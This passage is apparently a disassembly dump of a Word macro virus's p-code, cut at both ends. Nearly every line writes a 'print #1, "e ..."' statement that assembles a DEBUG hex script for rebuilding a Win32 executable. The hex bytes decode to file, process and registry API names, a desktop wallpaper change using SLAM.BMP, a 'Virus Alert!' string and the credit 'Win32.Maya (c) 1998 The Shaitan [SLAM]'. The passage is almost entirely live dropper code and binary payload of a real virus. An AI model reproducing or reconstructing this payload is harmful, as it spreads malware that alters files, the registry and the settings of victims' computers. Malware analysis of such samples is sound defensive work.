' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #302:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1380 00 46 69 6e 64 43 6c 6f 73 65 00 00 00 00 00 0f "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #303:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1390 00 00 00 53 65 74 46 69 6c 65 50 6f 69 6e 74 65 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #304:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 13a0 72 00 00 00 00 00 0d 00 00 00 53 65 74 45 6e 64 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #305:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 13b0 4f 66 46 69 6c 65 00 00 00 00 00 15 00 00 00 47 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #306:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 13c0 65 74 43 75 72 72 65 6e 74 44 69 72 65 63 74 6f "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #307:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 13d0 72 79 41 00 00 00 00 00 15 00 00 00 53 65 74 43 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #308:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 13e0 75 72 72 65 6e 74 44 69 72 65 63 74 6f 72 79 41 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #309:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 13f0 00 00 00 00 00 13 00 00 00 47 65 74 46 69 6c 65 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #310:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1400 41 74 74 72 69 62 75 74 65 73 41 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #311:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1410 13 00 00 00 53 65 74 46 69 6c 65 41 74 74 72 69 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #312:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1420 62 75 74 65 73 41 00 00 00 00 00 0e 00 00 00 47 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #313:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1430 65 74 53 79 73 74 65 6d 54 69 6d 65 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #314:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1440 00 15 00 00 00 47 65 74 57 69 6e 64 6f 77 73 44 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #315:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1450 69 72 65 63 74 6f 72 79 41 00 00 00 00 00 41 59 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #316:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1460 41 4d 0a 00 00 00 4d 6f 76 65 46 69 6c 65 41 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #317:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1470 00 00 00 00 a0 15 40 00 0a 00 00 00 43 6f 70 79 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #318:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1480 46 69 6c 65 41 00 00 00 00 00 ab 15 40 00 0c 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #319:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1490 00 00 43 72 65 61 74 65 46 69 6c 65 41 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #320:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 14a0 00 00 b6 15 40 00 0c 00 00 00 44 65 6c 65 74 65 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #321:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 14b0 46 69 6c 65 41 00 00 00 00 00 c1 15 40 00 13 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #322:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 14c0 00 00 53 65 74 46 69 6c 65 41 74 74 72 69 62 75 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #323:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 14d0 74 65 73 41 00 00 00 00 00 cc 15 40 00 13 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #324:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 14e0 00 47 65 74 46 69 6c 65 41 74 74 72 69 62 75 74 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #325:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 14f0 65 73 41 00 00 00 00 00 d7 15 40 00 11 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #326:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1500 47 65 74 46 75 6c 6c 50 61 74 68 4e 61 6d 65 41 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #327:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1510 00 00 00 00 00 e2 15 40 00 0f 00 00 00 43 72 65 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #328:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1520 61 74 65 50 72 6f 63 65 73 73 41 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #329:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1530 ed 15 40 00 49 41 48 53 43 6f 6e 74 72 6f 6c 20 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #330:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1540 50 61 6e 65 6c 5c 44 65 73 6b 74 6f 70 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #331:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1550 00 00 31 00 30 00 54 69 6c 65 57 61 6c 6c 70 61 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #332:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1560 70 65 72 00 57 61 6c 6c 70 61 70 65 72 53 74 79 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #333:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1570 6c 65 00 53 4c 41 4d 2e 42 4d 50 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #334:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1580 00 00 00 00 57 69 6e 33 32 2e 4d 61 79 61 20 28 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #335:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1590 63 29 20 31 39 39 38 20 54 68 65 20 53 68 61 69 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #336:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 15a0 74 61 6e 20 5b 53 4c 41 4d 5d 00 56 69 72 75 73 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #337:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 15b0 20 41 6c 65 72 74 21 00 55 53 45 52 33 32 2e 64 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #338:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 15c0 6c 6c 00 41 44 56 41 50 49 33 32 2e 64 6c 6c 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #339:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 15d0 00 00 00 00 00 00 00 00 00 00 00 00 52 65 67 4f "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #340:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 15e0 70 65 6e 4b 65 79 45 78 41 00 52 65 67 53 65 74 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #341:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 15f0 56 61 6c 75 65 45 78 41 00 4d 65 73 73 61 67 65 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #342:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1600 42 6f 78 41 00 53 79 73 74 65 6d 50 61 72 61 6d "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #343:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1610 65 74 65 72 73 49 6e 66 6f 41 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #344:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1620 00 00 00 00 00 00 00 00 00 00 00 42 4d e6 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #345:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1630 00 00 00 00 00 3e 00 00 00 28 00 00 00 3c 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #346:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1640 00 15 00 00 00 01 00 01 00 00 00 00 00 a8 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #347:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1650 00 c4 0e 00 00 c4 0e 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #348:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1660 00 00 00 00 00 ff ff ff 00 ff ff ff ff ff ff ff "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #349:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1670 f0 ff ff ff ff ff ff ff f0 ff ff ff ff ff ff ff "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #350:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1680 f0 ff ff ff ff ff ff ff f0 e0 02 00 83 e2 0e 3c "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #351:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1690 70 e0 02 00 83 e2 0e 3c 70 e3 82 0f 83 e2 0e 3c "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #352:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 16a0 70 e3 82 0f 83 e2 0e 3c 70 e3 82 0f 80 02 0e 3c "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #353:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 16b0 70 ff 82 0f 80 02 0e 3c 70 e0 02 1f c3 86 1e 3c "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #354:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 16c0 70 e0 02 3f e3 8e 3e 3c 70 e3 fe 3f e3 8e 3e 3c "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #355:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 16d0 70 e3 e2 3f e3 8e 3e 3c 70 e3 e2 3f e3 8e 3e 3c "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
